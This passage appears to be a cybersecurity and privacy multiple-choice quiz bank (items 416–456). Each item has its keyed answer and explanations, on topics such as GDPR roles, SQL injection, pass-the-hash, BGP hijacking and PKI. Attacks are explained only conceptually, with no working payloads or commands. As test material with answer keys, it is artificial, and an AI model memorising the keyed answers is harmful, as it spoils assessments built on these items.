  {id:416,domain:P,question:"What is the difference between a data controller and a data processor under GDPR?",options:["They are the same entity with different responsibilities","A data controller determines the purposes and means of processing personal data; a data processor processes data on behalf of and under instructions from the controller","Controllers process data; processors store data","Processors have more legal responsibility than controllers"],answer:1,explanation:"A hospital (controller) decides what patient data to collect; their cloud backup provider (processor) stores it per the hospital's instructions. Controllers bear primary GDPR responsibility.",optionExplanations:["Controllers and processors are distinct legal roles with different obligations under GDPR.","Controllers make decisions about what data to collect and why; processors act on the controller's behalf. A SaaS vendor may be a controller for their users' data and a processor for their customers' data.","Both controllers and processors can process and store data; the distinction is who decides the purpose and means.","Controllers bear primary GDPR compliance responsibility; processors have contractual obligations to controllers and some direct GDPR obligations."]},
  {id:417,domain:A,question:"What is Defense in Depth?",options:["Building an impenetrable single security layer","Implementing multiple overlapping security layers so that if one fails, others remain to detect or prevent an attack","Using defense-grade encryption for all data","Focusing all security resources on perimeter defense"],answer:1,explanation:"Defense in depth assumes breaches will occur and ensures that no single point of failure can compromise the entire organization — multiple layers buy time for detection.",optionExplanations:["A single impenetrable layer is the opposite of defense in depth; the approach recognizes no single control is perfect.","Defense in depth (or layered security) uses network firewalls, endpoint protection, encryption, access controls, monitoring, and physical security together so attackers must defeat multiple controls.","Defense-grade encryption is one possible layer; defense in depth is the architectural strategy of using many different types of controls together.","Perimeter-only defense is the old castle-and-moat model; defense in depth distributes controls throughout the environment."]},
  {id:418,domain:O,question:"What is vulnerability management?",options:["Managing software licenses","A continuous process of identifying, classifying, remediating, and mitigating vulnerabilities in IT systems","Auditing security configurations once per year","Managing security team resources"],answer:1,explanation:"Vulnerability management prioritizes remediation by risk severity, tracks remediation progress, and measures the organization's patch compliance over time.",optionExplanations:["Software license management is an asset management function; vulnerability management focuses on security weaknesses.","Vulnerability management uses scanning tools, tracks findings, prioritizes by CVSS score and exploitability, assigns remediation to owners, and validates fixes — creating a continuous improvement cycle.","Annual audits are point-in-time; vulnerability management is continuous to address the constant introduction of new vulnerabilities.","Resource management is an HR/operations function; vulnerability management is a security program addressing technical weaknesses."]},
  {id:419,domain:T,question:"What is an SQL injection attack?",options:["Inserting malicious data into SQL databases","Inserting malicious SQL code into application input fields to manipulate database queries, potentially exposing or modifying data","Flooding SQL servers with excessive queries","Using SQL scripts to escalate privileges"],answer:1,explanation:"SQL injection exploits applications that build queries by concatenating user input — attackers inject SQL that changes query logic to dump, modify, or delete data.",optionExplanations:["SQL injection doesn't simply insert data — it changes the structure of database queries through malicious input.","SQL injection works by breaking out of the intended query structure using characters like ' or --, then appending attacker-controlled SQL that changes what the database does.","Flooding SQL servers with queries is a database DoS attack; SQL injection targets query logic through application input.","SQL scripts for privilege escalation may use SQL injection as a technique, but SQL injection itself is the input manipulation technique, not specifically a privilege escalation approach."]},
  {id:420,domain:G,question:"What is the principle of defense through diversity?",options:["Hiring a diverse security team","Using different types or vendors of security controls so a single vulnerability cannot compromise all security layers simultaneously","Protecting data in multiple formats","Applying different encryption algorithms to different data types"],answer:1,explanation:"Monocultures (same OS everywhere) create single points of failure — a single exploit can compromise all systems. Diversity limits the blast radius of any single vulnerability.",optionExplanations:["Team diversity is important for many reasons; defense through diversity specifically refers to technology diversity in security controls.","Using diverse technologies means a zero-day in one vendor's firewall doesn't also defeat all other security layers — each layer has different attack surfaces and vulnerabilities.","Data format diversity doesn't address security control resilience; technology diversity in security controls does.","Using different encryption algorithms creates compatibility issues without clear security benefit; diversity refers to using different types and vendors of security controls in layers."]},
  {id:421,domain:T,question:"What is a botnet?",options:["A network of security bots monitoring systems","A network of compromised computers (bots) controlled by an attacker (botmaster) and used to conduct coordinated attacks","A legitimate automation network for IT tasks","A peer-to-peer file sharing network"],answer:1,explanation:"Botnets are used for DDoS attacks, spam campaigns, credential stuffing, cryptomining, and proxy services — the botmaster profits while victims bear costs.",optionExplanations:["Security monitoring bots are legitimate tools; a botnet consists of compromised victim machines under attacker control.","A botnet coordinates thousands to millions of compromised machines (zombies) for attacker purposes — the infected machines' owners typically don't know they're participating.","Legitimate automation uses tools like Ansible or Python scripts; botnets use malware-infected computers for malicious purposes.","Peer-to-peer networks enable file sharing; botnets are malicious networks of compromised computers serving the attacker."]},
  {id:422,domain:A,question:"What is a secure software development lifecycle (SSDLC)?",options:["Using only open-source software components","Integrating security activities into every phase of software development from requirements through deployment and maintenance","Performing security testing only before release","Hiring security experts to review finished code"],answer:1,explanation:"SSDLC (like Microsoft SDL or OWASP SAMM) integrates threat modeling, secure coding, SAST/DAST, and security training throughout development to reduce vulnerabilities.",optionExplanations:["Open-source software selection is a procurement decision; SSDLC is a development process framework.","SSDLC includes security requirements definition, threat modeling in design, secure coding standards, automated scanning (SAST/DAST), penetration testing, and secure deployment procedures.","Security testing only before release is a security bolt-on approach; SSDLC integrates security from the requirements phase.","Code review by security experts is one SSDLC activity; SSDLC is the broader lifecycle integrating security throughout all development phases."]},
  {id:423,domain:O,question:"What is a security risk register?",options:["A list of security tool vendors","A documented inventory of identified security risks, their likelihood, impact, and assigned owners with mitigation status","A log of security incidents","A database of known vulnerabilities"],answer:1,explanation:"Risk registers provide governance visibility into organizational risk posture, enabling prioritization of mitigation efforts and tracking progress over time.",optionExplanations:["Vendor lists are procurement assets; a risk register documents identified security risks and their management.","A risk register catalogs each identified risk with its probability, potential impact, risk score, who owns it, what mitigations are in place, and current status — driving risk-based security decisions.","Incident logs record past events; risk registers track potential future adverse events and their management.","Vulnerability databases list technical weaknesses; risk registers assess business-level risks that may stem from vulnerabilities or other sources."]},
  {id:424,domain:T,question:"What is port scanning?",options:["Scanning documents before emailing them","Probing network ports on target systems to identify open ports, running services, and operating systems for reconnaissance","Monitoring physical network ports for unauthorized devices","Scanning email ports for spam"],answer:1,explanation:"Port scanning (Nmap, Masscan) is reconnaissance that maps attack surface — identifying web servers, databases, SSH services, and other accessible services on a target.",optionExplanations:["Document scanning is an unrelated process; port scanning probes network communication endpoints.","Port scanning sends probe packets to determine which TCP/UDP ports are open, helping identify what services run on a host and potential attack entry points.","Physical port monitoring is a network access control function; port scanning is a network reconnaissance technique.","Email spam filtering is an email security function; port scanning probes network ports to discover available services."]},
  {id:425,domain:G,question:"What is multi-factor authentication (MFA)?",options:["Using multiple passwords for a single account","Requiring two or more independent verification factors (something you know, have, or are) before granting access","Using multiple security questions for account recovery","Authenticating users with multiple administrators approving access"],answer:1,explanation:"MFA dramatically reduces account takeover risk — even if credentials are stolen, attackers need the second factor (TOTP, hardware key, push notification) to gain access.",optionExplanations:["Multiple passwords is still single-factor (something you know); MFA requires different categories of evidence.","MFA combines factors from different categories: knowledge (password), possession (phone/token), and inherence (biometric) — requiring multiple independent factors that attackers must all compromise.","Security questions are all knowledge factors; MFA requires factors from different categories to provide genuine additional security.","Multiple administrator approvals is an administrative control; MFA is a technical authentication mechanism requiring multiple factor types."]},
  {id:426,domain:P,question:"What is data minimization?",options:["Compressing data to reduce storage costs","Collecting and retaining only the personal data that is strictly necessary for the specified purpose","Anonymizing all collected data","Limiting the number of employees who can access data"],answer:1,explanation:"Data minimization (GDPR Article 5) reduces privacy risk by limiting collection scope — data you don't collect cannot be breached or misused.",optionExplanations:["Data compression is a technical storage optimization; data minimization is a privacy principle about what data is collected.","Data minimization means not collecting more personal data than needed for the explicit purpose — if a service needs an email for account recovery, it shouldn't also collect date of birth, phone number, and address.","Anonymization transforms data so individuals can't be identified; minimization limits what is collected in the first place.","Access limitation is the principle of least privilege for data access; minimization limits the volume and scope of collection."]},
  {id:427,domain:A,question:"What is a cloud access security broker (CASB)?",options:["A cloud service provider's security team","A security policy enforcement point between cloud service users and cloud providers that monitors and controls cloud service usage","A cloud-based certificate authority","An authentication service for cloud applications"],answer:1,explanation:"CASBs provide visibility into shadow IT, enforce data loss prevention, detect threats in cloud apps, and apply compliance controls to cloud service usage.",optionExplanations:["Cloud provider security teams are internal to the CSP; a CASB is a third-party or customer-controlled security layer.","A CASB sits between users and cloud services (Office 365, Salesforce, Box), providing visibility, access control, threat detection, and data protection across all cloud usage.","Certificate authorities issue certificates; CASBs control and monitor cloud service usage.","Authentication services (IdPs) handle identity; CASBs enforce security policies on top of authenticated cloud service access."]},
  {id:428,domain:O,question:"What is security awareness training?",options:["Technical training for security engineers","Education programs that teach all employees to recognize and respond appropriately to security threats and their role in protecting organizational assets","Training employees to use security tools","Advanced training for penetration testers"],answer:1,explanation:"Humans are the most exploited attack vector — awareness training addresses phishing recognition, password hygiene, social engineering, and reporting suspicious activity.",optionExplanations:["Technical training for engineers is specialized; security awareness is designed for all employees regardless of technical role.","Security awareness training covers phishing recognition, safe browsing, social engineering tactics, physical security (tailgating), password management, and how to report security concerns.","Security tool training is technical skill development; awareness training builds general security knowledge across the workforce.","Penetration tester training is a specialized technical curriculum; security awareness is broad education for non-security employees."]},
  {id:429,domain:T,question:"What is an exploit kit?",options:["A toolkit for security researchers to document exploits","Automated attack tools that probe visiting browsers for vulnerabilities and automatically exploit them to deliver malware without user interaction","A collection of proof-of-concept exploits for testing","Software used by vendors to patch vulnerabilities"],answer:1,explanation:"Exploit kits (RIG, Magnitude) check browser fingerprints and automatically deliver appropriate exploits — a single drive-by download visit can result in malware installation.",optionExplanations:["Security researcher toolkits are legitimate research tools; exploit kits are malicious automated attack platforms.","Exploit kits are deployed on compromised or malicious websites and automatically detect and exploit unpatched browser vulnerabilities to deliver ransomware, banking trojans, or other malware.","Proof-of-concept exploit collections are research tools; exploit kits are weaponized automation platforms for mass exploitation.","Patch management tools address vulnerabilities; exploit kits exploit them."]},
  {id:430,domain:G,question:"What is an access control list (ACL)?",options:["A list of approved software for installation","A set of rules that control what traffic is allowed or denied through a network device or what actions subjects can perform on objects","A registry of user accounts","A list of blocked websites or IP addresses"],answer:1,explanation:"ACLs on routers/firewalls control network traffic; ACLs on file systems control who can read, write, or execute files — both implement discretionary or mandatory access control.",optionExplanations:["Approved software lists are application whitelists; ACLs control access to network resources or system objects.","ACLs define permissions — network ACLs permit/deny traffic based on IP/port/protocol; filesystem ACLs define what users or groups can do with files and directories.","User account registries are managed by directory services; ACLs reference those accounts to define their permissions.","Blocked website lists are web filter configurations or deny-list ACLs; ACLs are the broader mechanism that can both allow and deny access."]},
  {id:431,domain:T,question:"What is spear phishing?",options:["Phishing using spearguns as a metaphor","Highly targeted phishing attacks customized with personal information about the specific victim to increase believability and success rates","Mass phishing campaigns targeting an entire organization","Phishing attacks that use voice calls"],answer:1,explanation:"Spear phishing uses reconnaissance (LinkedIn, social media, company website) to craft convincing lures — attackers know the victim's name, job, colleagues, and projects.",optionExplanations:["The spear metaphor contrasts with wide-net phishing; it refers to precision targeting, not physical weapons.","Spear phishing personalizes the attack: 'Hi John, your manager Sarah asked me to resend the Q3 report' — specificity makes victims far more likely to act.","Mass phishing campaigns are generic phishing; spear phishing is targeted at specific individuals with personalized content.","Voice phishing is vishing; spear phishing uses email or digital messages but with a highly targeted, researched approach."]},
  {id:432,domain:A,question:"What is a load balancer from a security perspective?",options:["A device that tests network load capacity","A system that distributes traffic across multiple servers, improving availability and enabling DDoS mitigation and SSL termination","A tool for bandwidth throttling","A device that monitors network performance"],answer:1,explanation:"Load balancers improve resilience (no single server failure brings down the service) and can perform SSL offloading, WAF integration, and DDoS absorption.",optionExplanations:["Network load testing tools are performance testing instruments; load balancers are production infrastructure.","Load balancers distribute requests across a pool of servers, enabling higher availability, horizontal scaling, and centralized application security controls like SSL inspection.","Bandwidth throttling is a QoS/rate limiting function; load balancers distribute traffic for availability and performance.","Network performance monitoring uses SNMP, NetFlow, and other tools; load balancers route traffic, though they do collect performance metrics."]},
  {id:433,domain:O,question:"What is the purpose of log retention policies?",options:["Reducing storage costs by deleting logs quickly","Defining how long logs are kept to support incident investigation, compliance requirements, and forensic analysis","Automatically archiving logs to tape","Standardizing log formats across systems"],answer:1,explanation:"Log retention must balance regulatory requirements (PCI DSS: 1 year, HIPAA: 6 years) with storage costs and investigation needs — logs deleted too early lose forensic value.",optionExplanations:["Deleting logs quickly is the opposite of an effective retention policy; logs need to be kept long enough for investigations and compliance.","Log retention policies specify retention periods for different log types (access logs, authentication logs, security events) to meet legal, regulatory, and investigative needs.","Log archiving is a technical implementation; retention policies define the required retention periods and access requirements.","Log format standardization is a collection configuration issue; retention policies govern how long to keep logs regardless of format."]},
  {id:434,domain:T,question:"What is a pass-the-hash attack?",options:["Passing a hashed file to another system","Using a captured password hash directly to authenticate to services without cracking the plaintext password","Intercepting hash transmissions on the network","Creating hash collisions to forge authentication"],answer:1,explanation:"Windows NTLM allows authentication with the hash directly — attackers extract hashes from memory (using Mimikatz) and use them for lateral movement.",optionExplanations:["Passing files between systems is file transfer; pass-the-hash is a lateral movement technique in authentication.","Pass-the-hash exploits NTLM authentication: if an attacker captures the NTLM hash from memory, they can authenticate as that user to other systems without knowing the actual password.","Network interception captures credentials; pass-the-hash uses already-captured hashes from memory.","Hash collisions enable forgery attacks; pass-the-hash reuses legitimate hashes without needing to create collisions."]},
  {id:435,domain:G,question:"What is a digital certificate?",options:["An electronic version of a business license","An electronic document that uses a digital signature from a trusted CA to bind a public key to an identity","A digital signature applied to a document","A password stored in encrypted form"],answer:1,explanation:"Digital certificates (X.509 standard) establish trusted identity for HTTPS, code signing, email encryption, and VPN authentication by binding public keys to verified identities.",optionExplanations:["Business licenses are legal documents; digital certificates are cryptographic identity documents for public key binding.","A digital certificate contains the subject's identity, their public key, validity period, issuing CA, and the CA's digital signature — clients verify the CA signature to trust the certificate.","A digital signature is what the CA applies to create the certificate; the certificate itself contains the signature and the public key.","Passwords are authentication secrets; digital certificates establish public key identity through CA-verified binding."]},
  {id:436,domain:P,question:"What is anonymization vs. pseudonymization?",options:["They are the same process","Anonymization removes all identifying information permanently; pseudonymization replaces identifiers with artificial aliases that can be re-linked with additional information","Pseudonymization is stronger privacy protection than anonymization","Anonymization is required for GDPR compliance; pseudonymization is not"],answer:1,explanation:"GDPR considers anonymized data outside scope; pseudonymized data is still personal data since re-identification is possible. Pseudonymization reduces risk but doesn't eliminate privacy obligations.",optionExplanations:["Anonymization and pseudonymization provide different levels of privacy protection and have different legal implications.","Anonymized data cannot be linked back to individuals (irreversible); pseudonymized data uses tokens or aliases but retains the ability to re-identify individuals using a separate key.","Anonymization provides stronger privacy protection; pseudonymization is a risk reduction measure that still allows re-identification.","GDPR requires data protection regardless; anonymized data exits GDPR scope, but pseudonymized data remains subject to GDPR protections."]},
  {id:437,domain:A,question:"What is a network access control (NAC) system?",options:["A physical lock on network equipment","A system that enforces policies about which devices can connect to the network, verifying compliance before granting access","A list of allowed network protocols","A firewall rule set"],answer:1,explanation:"NAC (802.1X, Cisco ISE) checks device health (patching, AV, certificates) before allowing network access, quarantining non-compliant devices to a remediation VLAN.",optionExplanations:["Physical locks are physical security controls; NAC is a technical access control for network connectivity.","NAC enforces posture assessment — checking OS patches, AV status, disk encryption, and certificates — before granting devices access to corporate network resources.","Protocol allowlists are firewall and network policy configurations; NAC is a device authentication and posture assessment system.","Firewall rule sets control traffic flow between networks; NAC controls which devices are allowed to connect to the network in the first place."]},
  {id:438,domain:O,question:"What is the kill chain in cybersecurity?",options:["A technique for stopping malware processes","A framework (originally from military targeting) that describes the stages of a cyberattack from reconnaissance through achieving objectives","A method for forensic evidence collection","A list of commands used in malware"],answer:1,explanation:"Lockheed Martin's Cyber Kill Chain (Reconnaissance→Weaponization→Delivery→Exploitation→Installation→C2→Actions on Objectives) helps defenders understand and break attack sequences.",optionExplanations:["Stopping malware processes is incident response; the kill chain is a conceptual model of attack progression.","The kill chain framework breaks attacks into seven stages, allowing defenders to identify which stage they're detecting and develop controls to break the chain at each stage.","Evidence collection is forensic methodology; the kill chain is an analytical framework for understanding attack sequences.","Malware command sequences are threat intelligence details; the kill chain is an abstract framework applicable to any attack type."]},
  {id:439,domain:T,question:"What is a side-channel attack?",options:["Attacking through physical network ports","Exploiting information gained from the physical implementation of a cryptographic system (timing, power consumption, electromagnetic emissions) rather than weaknesses in the algorithm","A social engineering attack from a third party","Attacking backup systems that are not the primary target"],answer:1,explanation:"Timing attacks measure computation time to determine key bits; power analysis watches power consumption during crypto operations — these bypass mathematical security.",optionExplanations:["Physical network ports are part of network infrastructure; side channels are physical information leakages from computing systems.","Side-channel attacks extract secret keys by measuring physical characteristics during cryptographic operations — power usage fluctuates based on key bits being processed, leaking information.","Social engineering through third parties is supply chain social engineering; side channels are physical information leakage from hardware.","Backup system attacks are a network/persistence attack vector; side channels are physical measurement attacks against cryptographic hardware."]},
  {id:440,domain:G,question:"What is the difference between authentication and authorization?",options:["They are used interchangeably in security contexts","Authentication verifies identity ('who are you?'); authorization determines what an authenticated identity is permitted to do ('what can you do?')","Authorization occurs before authentication in the security process","Authentication is technical; authorization is a policy decision"],answer:1,explanation:"Authentication proves who you are (username/password, MFA); authorization determines your access rights (can this user read this file, access this API endpoint?).",optionExplanations:["Authentication and authorization are distinct, ordered steps in access control; conflating them leads to security design errors.","Authentication (logging in) must occur before authorization (what you can do) — you prove identity first, then the system checks your permissions.","Authentication always precedes authorization — you must establish who you are before the system can determine what you're allowed to do.","Both are technical and policy: authentication is verified technically; authorization policies are defined by administrators and enforced technically."]},
  {id:441,domain:T,question:"What is click fraud in the context of cybersecurity?",options:["Fraud committed by clicking fraudulent links","Automated fraudulent clicking on pay-per-click advertisements using bots or compromised computers to drain competitor budgets or generate revenue","A phishing technique using fake buttons","Identity theft through fake login buttons"],answer:1,explanation:"Click fraud botnets generate fake ad clicks — advertisers pay for worthless clicks (competitor sabotage) or publishers generate fraudulent revenue.",optionExplanations:["Clicking fraudulent links is phishing interaction; click fraud generates fraudulent clicks on advertisements specifically.","Click fraud uses bots to simulate user clicks on ads, costing advertisers money for traffic that never becomes customers, or generating fraudulent publisher revenue.","Fake buttons that steal credentials are phishing or clickjacking; click fraud specifically targets digital advertising systems.","Identity theft through login forms is credential phishing; click fraud targets advertising revenue systems."]},
  {id:442,domain:A,question:"What is a deception technology platform?",options:["Marketing technology that uses deceptive claims","Security tools that deploy decoys, traps, and breadcrumbs throughout the environment to detect attackers and slow their progress","Technology for detecting deepfake content","Social engineering training simulators"],answer:1,explanation:"Deception technology goes beyond honeypots — it plants fake credentials, files, and systems throughout the real environment to detect and mislead attackers.",optionExplanations:["Marketing deception is an ethics issue; deception technology is a security control that deliberately misleads attackers.","Deception platforms deploy fake users, files, network shares, and database records that look real but alert security when accessed — any interaction indicates attacker presence.","Deepfake detection is a media authenticity problem; deception technology is an attacker detection and misdirection strategy.","Social engineering training uses simulated attacks; deception technology uses fake assets to detect real attackers operating in the production environment."]},
  {id:443,domain:O,question:"What is a security audit?",options:["A comprehensive system performance test","An independent, systematic examination of security controls, policies, and practices to verify they meet requirements and are functioning effectively","A vulnerability scan of network systems","A review of employee security access rights"],answer:1,explanation:"Security audits provide independent verification that controls exist and work — they examine policies, test controls, interview staff, and review evidence against a standard.",optionExplanations:["Performance testing measures system capacity; security audits assess whether security controls meet requirements.","A security audit systematically evaluates controls against a framework (ISO 27001, NIST, PCI DSS) through documentation review, testing, and interviews to provide assurance of compliance.","Vulnerability scanning is a technical assessment tool; auditing is a broader examination of the entire security program including governance, process, and technical controls.","Access rights review is user provisioning audit; a security audit covers the entire security control environment."]},
  {id:444,domain:T,question:"What is BGP hijacking?",options:["Taking over a network router","Manipulating Border Gateway Protocol routing to redirect internet traffic through attacker-controlled infrastructure","Hijacking encrypted BGP sessions","An attack on Border Gateway Patrol systems"],answer:1,explanation:"BGP hijacking announces false route information, redirecting traffic through attacker infrastructure for interception, blackholing, or traffic analysis.",optionExplanations:["Router takeover is device compromise; BGP hijacking manipulates routing protocol announcements.","BGP (the internet's routing protocol) trusts route announcements; attackers announce more specific routes than the legitimate owner to intercept or blackhole traffic across the internet.","BGP session encryption (using RPKI and BGPsec) is a mitigation; hijacking is the attack on BGP's route announcement trust model.","BGP stands for Border Gateway Protocol; there is no Border Gateway Patrol."]},
  {id:445,domain:G,question:"What is public key infrastructure (PKI)?",options:["A government-run key management system","The framework of policies, procedures, hardware, software, and roles needed to create, manage, distribute, and revoke digital certificates","A public database of encryption keys","A system for managing SSH keys"],answer:1,explanation:"PKI enables trust at scale — CAs vouch for public key ownership, browsers trust CA-signed certificates, enabling secure HTTPS worldwide.",optionExplanations:["PKI can be government-run or privately operated; it's not inherently governmental.","PKI encompasses certificate authorities (CAs), registration authorities (RAs), certificate policies, CRL/OCSP infrastructure, and key management procedures — the complete ecosystem for certificate-based trust.","Public key servers (key servers) store public keys for email; PKI is the trust hierarchy that verifies key ownership through signed certificates.","SSH key management is a separate concern; PKI uses X.509 certificates and is primarily used for TLS, code signing, and email encryption."]},
  {id:446,domain:P,question:"What is the purpose of a privacy notice?",options:["A warning about data breach risks","A communication to individuals explaining what personal data is collected, why, how it's used, and what rights individuals have","An internal policy for employee data handling","A legal contract between users and the organization"],answer:1,explanation:"Privacy notices (required by GDPR Article 13/14) must be concise, transparent, and provided at the time of data collection — they enable informed consent.",optionExplanations:["Data breach risk warnings may be part of a notice but are not its primary purpose; privacy notices inform about data practices.","Privacy notices (privacy policies) explain the organization's data collection practices, legal basis for processing, retention periods, data sharing, and individuals' rights — enabling informed decisions.","Internal privacy policies guide employee behavior; privacy notices communicate externally to data subjects.","Privacy notices are informational; Terms of Service or data processing agreements are contracts. Privacy notices inform rather than create contractual obligations."]},
  {id:447,domain:A,question:"What is the purpose of network traffic analysis (NTA)?",options:["Optimizing network bandwidth allocation","Analyzing network flow data to detect anomalies, malicious communications, lateral movement, and data exfiltration","Monitoring internet usage for productivity","Documenting network topology changes"],answer:1,explanation:"NTA (using tools like Darktrace, ExtraHop, Vectra) establishes behavioral baselines and alerts on deviations — finding attackers who evade signature-based detection.",optionExplanations:["Bandwidth optimization is a network performance function; NTA focuses on detecting security threats in traffic patterns.","NTA analyzes network flows, protocols, and behaviors to detect C2 communications, unusual data transfers, scanning activity, and lateral movement that signatures might miss.","Productivity monitoring is an HR/employee management function; NTA is a security detection capability.","Network topology documentation is a network management function; NTA is real-time behavioral analysis of network traffic for security threats."]},
  {id:448,domain:O,question:"What is penetration testing methodology?",options:["An unstructured hacking attempt on systems","A structured approach to simulating attacks (reconnaissance, scanning, exploitation, post-exploitation, reporting) to identify vulnerabilities and validate security controls","A vulnerability scanning process","An annual security audit process"],answer:1,explanation:"Pentest methodology (defined in PTES, OWASP, NIST 800-115) ensures comprehensive coverage, reproducibility, and actionable reporting of discovered vulnerabilities.",optionExplanations:["Unstructured hacking attempts lack documentation and scope; penetration testing follows defined methodology with authorization.","Penetration testing follows structured phases: pre-engagement (scope, authorization), reconnaissance, scanning, exploitation, post-exploitation (lateral movement), and detailed reporting with remediation guidance.","Vulnerability scanning identifies potential weaknesses without exploiting them; penetration testing actively exploits vulnerabilities to demonstrate real impact.","Annual audits are compliance activities; penetration testing is active simulation of attacker techniques within an authorized scope."]},
  {id:449,domain:T,question:"What is a birthday attack in cryptography?",options:["Attacking systems on the birthday of an organization","Exploiting the birthday paradox to find hash collisions — finding two different inputs that produce the same hash value — much faster than brute force","A social engineering attack using personal birthdate information","A timing attack targeting key generation"],answer:1,explanation:"The birthday paradox means collision probability is much higher than intuition suggests — finding any two matching hash inputs requires only ~2^(n/2) attempts vs. 2^n.",optionExplanations:["Birthday attacks exploit mathematical probability, not actual birthdays.","Birthday attacks exploit the statistical property that collisions (two inputs with the same hash) are found surprisingly quickly — SHA-1 had birthday attack vulnerabilities that enabled collision attacks.","Using birthdate information in social engineering is OSINT; birthday attacks are mathematical attacks on hash functions.","Timing attacks measure computation duration; birthday attacks exploit the birthday paradox to find hash collisions."]},
  {id:450,domain:G,question:"What is a hardware root of trust?",options:["Trusting hardware vendors implicitly","A hardware component (TPM, secure enclave) that provides a foundation of trust for the system — verifying boot integrity and protecting cryptographic keys","A physical key for server rooms","Hardware that is certified by a trusted authority"],answer:1,explanation:"Hardware roots of trust (TPM, Intel TXT, ARM TrustZone) enable measured boot, device attestation, and secure key storage — providing trust that cannot be undermined by software.",optionExplanations:["Implicit vendor trust is a supply chain risk management issue; hardware root of trust is a specific cryptographic and integrity technology.","A hardware root of trust (TPM 2.0, Apple Secure Enclave, ARM TrustZone) establishes verified system integrity from power-on, protecting keys in tamper-resistant hardware.","Physical access control keys are physical security tools; hardware root of trust is a cryptographic and integrity assurance technology.","Hardware certification by trusted authorities is supply chain verification; a hardware root of trust is the on-device trusted component that enables secure computing."]},
  {id:451,domain:T,question:"What is a typosquatting attack?",options:["Squatting in a server room","Registering domain names that are common misspellings of legitimate sites to capture mistyped URLs and serve malicious content","Typing malware code rapidly to avoid detection","Creating fake keyboard shortcuts"],answer:1,explanation:"Typosquatters register 'gooogle.com', 'paypa1.com', etc., capturing mistyped traffic and serving phishing pages, malware, or ads to unknowing victims.",optionExplanations:["Squatting in a server room is a physical security concern; typosquatting registers look-alike domains.","Typosquatting exploits common typing errors — transpositions, added/missing letters, wrong TLDs — to capture traffic from users who mistype URLs and redirect them to malicious sites.","Typing speed in malware development is irrelevant to the attack technique; typosquatting is a domain registration strategy.","Keyboard shortcuts are OS/application features; typosquatting targets URL typos entered in browser address bars."]},
  {id:452,domain:A,question:"What is secure boot?",options:["A physically secured server boot process","A firmware-level security feature that verifies the digital signatures of boot components before execution, preventing unauthorized code from running during startup","A boot process that requires administrator authentication","An encrypted hard drive boot sequence"],answer:1,explanation:"Secure Boot (UEFI feature) verifies each component in the boot chain is signed by a trusted key — preventing bootloader-level malware (bootkits) from persisting.",optionExplanations:["Physical security of the boot process is data center control; Secure Boot is a firmware-level cryptographic verification.","Secure Boot uses cryptographic signatures to verify bootloader, kernel, and driver integrity before execution — ensuring no tampered or unauthorized code runs during the boot process.","Administrator authentication at boot is a pre-boot authentication feature; Secure Boot is automated signature verification, not human authentication.","Drive encryption is handled by BitLocker/LUKS; Secure Boot verifies the integrity of boot code, not data encryption."]},
  {id:453,domain:O,question:"What is security orchestration?",options:["Organizing the security team hierarchy","Integrating and coordinating multiple security tools and processes to work together and execute automated response workflows","Conducting security training sessions","Managing security project timelines"],answer:1,explanation:"Security orchestration (in SOAR platforms) integrates SIEM, EDR, threat intelligence, ticketing, and firewalls to execute playbooks spanning multiple tools automatically.",optionExplanations:["Team hierarchy management is organizational design; orchestration coordinates technology tools and workflows.","Orchestration connects disparate security tools through APIs, allowing events in one system to automatically trigger actions in others — a SIEM alert can trigger EDR isolation and firewall block simultaneously.","Security training is an awareness function; orchestration automates technical response workflows.","Project management is an organizational function; orchestration is the technical integration of security tools into automated workflows."]},
  {id:454,domain:T,question:"What is a replay attack?",options:["Attacking a recording or playback system","Intercepting valid data transmission and maliciously retransmitting it to gain unauthorized access or repeat an action","Playing back audit logs to reconstruct attacks","Repeating a social engineering script"],answer:1,explanation:"Replay attacks reuse captured authentication tokens or transactions — prevented by timestamps, nonces, and sequence numbers that make captured data invalid for retransmission.",optionExplanations:["Attacking recording systems is a different attack category; replay attacks target authentication or transaction systems using captured valid data.","Replay attacks capture valid authentication packets or tokens and retransmit them later to authenticate as the original user without knowing their credentials.","Audit log playback is a forensic investigation technique; replay attacks attempt to gain unauthorized access through retransmission.","Social engineering script repetition is social engineering; replay attacks are technical attacks using captured network data."]},
  {id:455,domain:G,question:"What is the purpose of a Certificate Authority (CA)?",options:["Managing network access certificates","A trusted entity that issues digital certificates, verifying the identity of certificate requestors and binding their identity to a public key","Providing encryption keys for users","Managing software license certificates"],answer:1,explanation:"CAs form the trust hierarchy of PKI — browsers ship with trusted root CA lists; organizations can also run private CAs for internal certificate management.",optionExplanations:["Network access certificates may use a CA; the CA itself is the trust anchor that vouches for identity, not an access manager.","A CA validates the identity of requestors (through DV, OV, or EV verification), issues X.509 certificates binding their identity to a public key, and maintains certificate revocation lists.","CAs don't provide encryption keys — they bind existing public keys to verified identities. Users generate their own key pairs.","Software licenses are commercial agreements; CAs issue cryptographic identity certificates for authentication and secure communications."]},
  {id:456,domain:P,question:"What is purpose limitation in data privacy?",options:["Restricting data collection and handling to authorized staff based on job need, rather than specifying the permitted use of the data collected","Collecting personal data only for specified, explicit, legitimate purposes and not further processing it for incompatible purposes","Limiting personal data collection geographically to individuals residing within specific regulatory jurisdictions, such as EU member states, based on data residency laws","Requiring that personal data be processed only within defined retention timeframes and deleted or anonymized once those organizational or regulatory periods expire"],answer:1,explanation:"GDPR Article 5(1)(b) requires data be collected for specific purposes — using customer data collected for order fulfillment for marketing requires new consent.",optionExplanations:["Staff access restrictions implement least privilege; purpose limitation restricts the permitted uses of collected data, not which employees can access it.","Purpose limitation means the purpose for which data is collected must be stated upfront, and data cannot be repurposed for incompatible uses without new legal basis (usually consent).","Geographic limitations address data residency or cross-border transfer rules; purpose limitation concerns the intended use of data, not the location of data subjects.","Time-based restrictions are data retention periods; purpose limitation restricts the reasons data can be used, not the duration for which it may be stored."]},
